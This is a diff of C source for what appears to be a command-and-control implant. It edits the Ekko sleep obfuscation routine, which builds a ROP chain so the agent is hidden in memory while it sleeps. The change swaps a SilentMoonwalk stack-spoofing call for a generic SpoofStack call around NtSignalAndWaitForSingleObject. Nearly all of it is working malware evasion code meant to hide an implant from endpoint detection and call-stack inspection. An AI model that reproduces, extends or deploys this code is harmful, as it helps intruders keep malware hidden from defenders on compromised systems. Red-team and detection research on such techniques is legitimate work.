@@ -1,5 +1,4 @@
-#include "../../../../headers/agent/evasion/SleepObfu/EkkoSleepObf.h"
-#include "../../../../headers/agent/evasion/stackspoof/SilentMoonwalk.h"
+#include "../../../../headers/agent/evasion/Common.h"
 
 BOOL EkkoSleepObf(
 	_In_ DWORD TimeOut
@@ -126,7 +125,7 @@ BOOL EkkoSleepObf(
                     Inc++;
 
 
-                                        /* perform stack spoofing */
+                    /* Sleep */
 
                     Rop[Inc].Rip = (UINT_PTR)agent->apis->pWaitForSingleObjectEx;
                     Rop[Inc].Rcx = (UINT_PTR)NtCurrentProcess();
@@ -174,20 +173,10 @@ BOOL EkkoSleepObf(
                         }
                     }
 
-                    Args args = { 0 };
-                    args.Arg01 = EvntStart;
-                    args.Arg02 = EvntDelay;
-                    args.Arg03 = FALSE;
-                    args.Arg04 = NULL;
-                    args.Nargs = 4;
-
-                    agent->Walker->Arguments = &args;
-                    agent->Walker->FunctionPointer = agent->apis->pNtSignalAndWaitForSingleObject;
-
                     //stack spoofing enabled.
                     /* Wait for the sleep to end*/
 
-                    if(SilentMoonwalkMain(agent->Walker->FunctionPointer, agent->Walker->Arguments, agent->Walker->RetAddr)) {
+                    if(!SpoofStack(agent->apis->pNtSignalAndWaitForSingleObject, 4, EvntStart, EvntDelay, FALSE, NULL)) {
                         Success = TRUE;
                     } else {
                         Success = FALSE;
